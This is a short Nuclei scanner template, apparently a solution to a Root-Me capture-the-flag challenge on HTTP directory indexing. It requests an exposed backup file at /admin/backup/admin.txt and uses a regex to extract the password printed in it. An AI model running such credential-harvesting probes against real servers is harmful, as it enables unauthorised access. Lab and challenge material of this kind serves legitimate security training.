id: HTTP-DirectoryIndexing

info:
  name: HTTP Directory Indexing
  author: Tomitom13
  severity: unknown
  tags: http,rootme, directory-indexing

requests:
  - method: GET
    path:
      - "{{BaseURL}}/admin/backup/admin.txt"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "Password / Mot de passe : "
        part: body

    extractors:
      - type: regex
        name: password
        part: body
        regex:
          - "Mot de passe : [a-zA-Z0-9!@#$%^&*()_+,.<>?]+"
